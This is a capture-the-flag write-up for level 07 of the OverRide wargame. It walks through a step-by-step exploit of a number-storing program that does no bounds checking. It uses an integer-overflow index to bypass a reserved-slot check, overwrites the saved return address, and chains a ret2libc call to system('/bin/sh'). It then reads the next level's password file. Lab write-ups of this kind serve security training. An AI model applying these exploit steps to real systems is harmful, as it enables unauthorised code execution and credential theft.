# Level 07

Level 07's program is a number storer/reader.
It stores the numbers in an `char v6[400]` but it doesn't do bounds checking, so we have to take advantage of that.

It does do some checking, namely if the index is divisible by 3 or if HIBYTE(index) == 183 we are not allowed to write there.
But we can bypass that by giving indices which are bigger than INT_MAX.

```shell
(gdb) b read_number 
Breakpoint 1 at 0x80486dd
(gdb) r
[...]
(gdb) x/x $ebp + 0x8
0xffffd5b0:	0xffffd5d4
# 0xffffd5d4 is the value of the passed argument,
# 0xffffd5b0 is where it is being stored inside `read_number`
```

By trial and error, we find that the saved EIP is at index 114.
Trying to store a number at 114 tells us the index is reserved for Wil, so using [bitwiseCMD](https://bitwisecmd.com/) (`MIN_INT | 114`) we get index -2147483534.
Storing an integer at that index lets us overwrite the EIP.
Now we just need to store our Ret2Libc attack on indices 114, 115 and 116.

```shell
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system> # 4159090384 in Decimal
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>  # 4159040368 in Decimal
(gdb) info proc map
process 1965
Mapped address spaces:
[...]
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
[...]
(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
0xf7f897ec # 4160264172 in Decimal
1 pattern found.
```

## Now all together!
```shell
level07@OverRide:~$ ./level07 
[...]
Input command: store
 Number: 4159090384
 Index: -2147483534
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
[deleted]
```
